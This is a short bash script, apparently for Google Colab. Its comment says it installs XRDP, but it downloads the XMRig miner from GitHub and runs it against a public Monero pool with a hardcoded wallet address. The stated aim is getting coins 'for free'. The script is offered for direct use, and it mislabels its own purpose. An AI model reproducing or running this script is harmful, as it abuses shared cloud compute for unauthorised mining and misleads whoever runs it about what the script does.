#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
tar xvzf xmrig-6.17.0-linux-x64.tar.gz
cd xmrig-6.17.0
./xmrig -o pool.supportxmr.com:3333 -u 43i2BQCTpaqQAVM7RHggdZYCbd6cqVLhGcyzm6hr4NDzhkzD8tH8nrfhZJAYGGPcjbDqi5oeAzeu8CajwgByECkaHfYrM64 -k
